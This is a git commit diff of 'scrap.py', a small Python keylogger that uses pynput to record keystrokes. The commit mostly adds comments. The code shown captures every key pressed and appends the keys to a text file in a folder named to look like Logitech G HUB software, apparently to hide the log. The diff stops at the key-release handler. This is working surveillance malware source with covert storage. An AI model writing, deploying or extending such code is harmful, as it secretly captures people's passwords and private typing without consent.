50ffb2df2e35f21b14e48aa0f5ba38aa6b269cce
zaynebbdj <94290562+zaynebbdj@users.noreply.github.com>
2024-02-04 19:23:12 +0100

    Update scrap.py

--- scrap.py
+++ scrap.py
@@ -1,7 +1,9 @@
 from pynput.keyboard import Key, Listener
 import os
 
+# array to stocks the pressed keys
 keys = []
+# file where the keys are written
 target_folder = r'C:\Program_Files\LGHUB\scrapped'
 
 keycode_to_char = {
@@ -12,25 +14,27 @@ keycode_to_char = {
 }
 
 def get_key_representation(key):
-    if key in keycode_to_char:
+    if key in keycode_to_char: # 'space', 'enter' or 'esc'  replaced by a line crossing
         return keycode_to_char[key]
-    elif str(key).find("Key") == -1:
-        return str(key).replace("'","")
-
+    elif str(key).find("Key") == -1:    # as soon as it is not a a 'Key.()' key
+        return str(key).replace("'","") # add the char replacing "'" by ""
+        
+# save the keys stocked in keys in the target file 'file_path'
 def save(keys, file_path):
     with open(file_path,'a') as myfile:
         for key in keys:
             myfile.write(key)
-    
+
+
 def press_on(key):
     global keys
-    print(key)
-    keys.append(get_key_representation(key))
+    print(key) 
+    keys.append(get_key_representation(key)) #ajout de la touche préssée au tableau keys
     if key in keycode_to_char:
         global target_folder
         os.makedirs(target_folder, exist_ok=True)  
         save(keys, os.path.join(target_folder, 'save.txt'))
-        keys = []
+        keys = [] 
     
 
 def press_off(key):
